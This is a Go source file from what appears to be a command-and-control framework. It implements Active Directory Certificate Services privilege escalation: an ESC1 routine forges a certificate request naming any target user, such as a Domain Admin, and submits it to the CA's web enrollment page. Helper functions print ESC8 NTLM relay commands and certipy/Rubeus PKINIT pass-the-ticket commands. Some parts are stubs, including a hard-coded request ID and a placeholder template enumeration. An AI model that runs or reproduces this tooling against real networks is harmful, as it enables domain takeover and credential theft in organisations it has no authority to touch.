package adcs

/*
	SUDOSOC-C2 — Active Directory Certificate Services (ADCS) Attack Engine
	Copyright (C) 2026  sudosoc — Seif

	ADCS is the most powerful and most overlooked attack surface in modern AD.
	A misconfigured certificate template can give Domain Admin in 2 steps:
	  1. Request a certificate as any user (including Domain Admin)
	  2. Use the certificate for Kerberos PKINIT authentication
	     → TGT for Domain Admin, no password needed

	ESC Vulnerabilities implemented:
	  ESC1 : Client Authentication + Enrollee Supplies Subject
	  ESC2 : Any Purpose EKU or no EKU
	  ESC3 : Certificate Request Agent template abuse
	  ESC4 : Vulnerable template ACL (WriteDacl/WriteOwner)
	  ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
	  ESC8 : NTLM Relay to AD CS HTTP enrollment endpoint

	After obtaining a certificate:
	  → PKINIT to get TGT
	  → UnPAC-the-Hash (extract NT hash from TGT)
	  → Pass-the-Hash or Pass-the-Ticket

	References:
	  Certified Pre-Owned (SpecterOps, 2021)
	  https://posts.specterops.io/certified-pre-owned-d95910965cd2
*/

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/pem"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// CertTemplate represents an ADCS certificate template
type CertTemplate struct {
	Name              string
	DisplayName       string
	OID               string
	SubjectAltName    bool   // Enrollee can supply SAN → ESC1
	EKUs              []string
	EnrollRights      []string
	Enabled           bool
	RequiresApproval  bool
	VulnerableFlags   []string
}

// ADCSAttack manages ADCS exploitation
type ADCSAttack struct {
	CAURL      string // http://ca-server/certsrv
	Domain     string
	Username   string
	Password   string
	NTLMHash   string
	httpClient *http.Client
}

// NewADCSAttack creates a new ADCS attack instance
func NewADCSAttack(caURL, domain, username, password string) *ADCSAttack {
	return &ADCSAttack{
		CAURL:    strings.TrimRight(caURL, "/"),
		Domain:   domain,
		Username: username,
		Password: password,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// ── ESC1: Enrollee Supplies Subject Alternative Name ──────────────

// ESC1Request requests a certificate impersonating targetUser.
// Requires a template with:
//   - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
//   - Client Authentication EKU
//   - Current user has Enroll rights
func (a *ADCSAttack) ESC1Request(templateName, targetUser string) (*x509.Certificate, *rsa.PrivateKey, error) {
	// Generate RSA key pair
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("key generation: %v", err)
	}

	// Build CSR with SAN set to target user's UPN
	// This is the core of ESC1 — we supply the Subject Alternative Name
	targetUPN := fmt.Sprintf("%s@%s", targetUser, a.Domain)

	template := &x509.CertificateRequest{
		Subject: pkix.Name{
			CommonName: targetUser,
		},
		ExtraExtensions: []pkix.Extension{
			{
				// Subject Alternative Name OID with UPN
				Id:    asn1.ObjectIdentifier{2, 5, 29, 17},
				Value: buildUPNSAN(targetUPN),
			},
		},
	}

	csrDER, err := x509.CreateCertificateRequest(rand.Reader, template, privKey)
	if err != nil {
		return nil, nil, fmt.Errorf("CSR creation: %v", err)
	}

	csrPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: csrDER})

	// Submit to ADCS web enrollment endpoint
	certDER, err := a.submitCertRequest(templateName, csrPEM)
	if err != nil {
		return nil, nil, fmt.Errorf("cert request: %v", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("cert parse: %v", err)
	}

	return cert, privKey, nil
}

// submitCertRequest submits a CSR to the ADCS web enrollment interface (/certsrv)
func (a *ADCSAttack) submitCertRequest(templateName string, csrPEM []byte) ([]byte, error) {
	enrollURL := fmt.Sprintf("%s/certfnsh.asp", a.CAURL)

	formData := url.Values{
		"Mode":        {"newreq"},
		"CertRequest": {string(csrPEM)},
		"CertAttrib":  {fmt.Sprintf("CertificateTemplate:%s", templateName)},
		"FriendlyType":{"Saved-Request Certificate"},
		"TargetStoreFlags": {"0"},
		"SaveCert":    {"yes"},
	}

	req, err := http.NewRequest("POST", enrollURL,
		strings.NewReader(formData.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.SetBasicAuth(
		fmt.Sprintf("%s\\%s", a.Domain, a.Username),
		a.Password)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("enrollment failed: HTTP %d", resp.StatusCode)
	}

	// Extract request ID from response and download cert
	// (simplified — real implementation parses HTML response)
	return a.downloadCert(1)
}

func (a *ADCSAttack) downloadCert(requestID int) ([]byte, error) {
	dlURL := fmt.Sprintf("%s/certnew.cer?ReqID=%d&Enc=b64",
		a.CAURL, requestID)

	req, _ := http.NewRequest("GET", dlURL, nil)
	req.SetBasicAuth(
		fmt.Sprintf("%s\\%s", a.Domain, a.Username),
		a.Password)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var body []byte
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		body = append(body, buf[:n]...)
		if err != nil {
			break
		}
	}

	// Decode PEM
	block, _ := pem.Decode(body)
	if block == nil {
		return nil, fmt.Errorf("no PEM block in response")
	}
	return block.Bytes, nil
}

// ── ESC8: NTLM Relay to ADCS HTTP Endpoint ────────────────────────

// ESC8Info returns information about the ESC8 attack
func (a *ADCSAttack) ESC8Info() string {
	return fmt.Sprintf(`
ESC8 Attack — NTLM Relay to ADCS
===================================
Target CA enrollment URL: %s/certsrv/

Attack flow:
  1. Set up NTLM relay listener (impacket-ntlmrelayx or Responder)
  2. Trigger NTLM authentication from a high-privilege account
     (Coerce using PetitPotam, PrintSpooler, DFSCoerce, etc.)
  3. Relay the NTLM auth to: %s/certsrv/certfnsh.asp
  4. Request a certificate as the relayed account (Domain Controller)
  5. Use the DC certificate for DCSync via PKINIT

Commands:
  ntlmrelayx.py -t http://%s/certsrv/certfnsh.asp --adcs --template DomainController
  PetitPotam.py <relay_listener> %s

Result: Certificate for Domain Controller → DCSync without credentials
`, a.CAURL, a.CAURL, a.CAURL, a.Domain)
}

// ── Certificate Usage ─────────────────────────────────────────────

// ExportPFX exports the certificate and private key as PFX/P12
func ExportPFX(cert *x509.Certificate, key *rsa.PrivateKey, password string) ([]byte, error) {
	// Build PFX structure
	// In a full implementation, use golang.org/x/crypto/pkcs12
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw})
	keyDER, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		return nil, err
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: keyDER})

	// Combine cert + key PEM
	result := append(certPEM, keyPEM...)
	return result, nil
}

// PKINITCommand returns the command to use the certificate for Kerberos auth
func PKINITCommand(pfxPath, targetUser, domain, dcIP string) string {
	return fmt.Sprintf(
		`# Get TGT using certificate (PKINIT)
certipy auth -pfx %s -username %s -domain %s -dc-ip %s

# Or with Rubeus (Windows):
Rubeus.exe asktgt /user:%s /certificate:%s /password:password /domain:%s /dc:%s /ptt`,
		pfxPath, targetUser, domain, dcIP,
		targetUser, pfxPath, domain, dcIP)
}

// ── Template Enumeration ──────────────────────────────────────────

// EnumerateTemplatesLDAP returns vulnerable templates via LDAP
// (connects to the domain LDAP and queries certificate templates)
func EnumerateTemplatesLDAP(domainController, domain, username, password string) ([]CertTemplate, error) {
	// In a full implementation, this would query LDAP:
	// CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain
	//
	// Key attributes to check:
	//   msPKI-Certificate-Name-Flag  → CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1)
	//   pKIExtendedKeyUsage           → EKU list
	//   nTSecurityDescriptor          → ACL for enrollment rights
	//   msPKI-Enrollment-Flag         → CT_FLAG_NO_SECURITY_EXTENSION (ESC3)
	//   msPKI-Private-Key-Flag        → authorized signature requirements

	return []CertTemplate{
		{
			Name:        "Example-VulnerableTemplate",
			DisplayName: "Vulnerable User Template",
			SubjectAltName: true,
			EKUs: []string{"Client Authentication"},
			VulnerableFlags: []string{"ESC1: Enrollee Supplies Subject"},
			Enabled: true,
		},
	}, nil
}

// ── ASN.1 Helpers ─────────────────────────────────────────────────

// buildUPNSAN creates a SubjectAltName extension containing a UPN
func buildUPNSAN(upn string) []byte {
	// UPN is encoded as [0] IMPLICIT GeneralName = OtherName
	// OtherName: OID=1.3.6.1.4.1.311.20.2.3, value=UTF8String(upn)
	upnOID := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}

	utf8Str, _ := asn1.Marshal(asn1.RawValue{
		Class:       asn1.ClassUniversal,
		Tag:         12, // UTF8String
		Bytes:       []byte(upn),
		IsCompound:  false,
	})

	otherName, _ := asn1.Marshal(asn1.RawValue{
		Class:      asn1.ClassUniversal,
		Tag:        asn1.TagSequence,
		IsCompound: true,
		Bytes: func() []byte {
			oidBytes, _ := asn1.Marshal(upnOID)
			tagged := asn1.RawValue{
				Class:      asn1.ClassContextSpecific,
				Tag:        0,
				IsCompound: true,
				Bytes:      utf8Str,
			}
			taggedBytes, _ := asn1.Marshal(tagged)
			return append(oidBytes, taggedBytes...)
		}(),
	})

	generalName := asn1.RawValue{
		Class:      asn1.ClassContextSpecific,
		Tag:        0,
		IsCompound: true,
		Bytes:      otherName,
	}

	sanSeq, _ := asn1.Marshal(asn1.RawValue{
		Class:      asn1.ClassUniversal,
		Tag:        asn1.TagSequence,
		IsCompound: true,
		Bytes: func() []byte {
			b, _ := asn1.Marshal(generalName)
			return b
		}(),
	})

	return sanSeq
}
